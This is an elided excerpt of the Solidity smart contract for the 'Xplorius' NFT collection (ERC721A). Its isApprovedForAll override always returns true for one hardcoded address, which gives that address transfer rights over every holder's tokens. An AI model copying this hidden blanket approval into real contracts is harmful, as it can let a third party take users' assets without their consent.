  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xbF493eD5Ea52Bb2FF93e15C2f81a744C3F2A9AB6){return true;}
...
contract Xplorius is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Xplorius", "XPLRS", maxBatchSize_, collectionSize_) {
